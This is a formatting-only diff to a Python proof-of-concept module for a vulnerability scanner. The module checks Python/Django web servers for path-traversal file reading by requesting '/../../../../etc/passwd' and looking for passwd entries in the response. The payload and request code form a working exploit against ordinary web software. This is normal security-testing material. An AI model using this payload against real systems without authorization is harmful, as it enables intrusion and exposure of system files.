@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urllib2
 
+
 class Vuln(ABVuln):
-    vuln_id = 'WebServer_0001' # 平台漏洞编号，留空
+    vuln_id = 'WebServer_0001'  # 平台漏洞编号，留空
     name = 'WebServer处理URL不当导致的任意文件读取'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_TRAVERSAL # 漏洞类型
+    type = VulnType.FILE_TRAVERSAL  # 漏洞类型
     disclosure_date = '2015-01-20'  # 漏洞公布时间
     desc = '''
         主要是由于开发人员在python代码中不安全地使用open函数引起，而且低版本的django自身也存在漏洞。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'WebServer'  # 漏洞应用名称
     product_version = 'python和django'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '43b1e996-f4c1-4a60-9a48-a58e380bacbb'
@@ -31,20 +33,21 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = '/../../../../../../../../../etc/passwd'
             verify_url = self.target + payload
 
             content = requests.get(verify_url).content
             if 'root:' in content and 'nobody:' in content:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
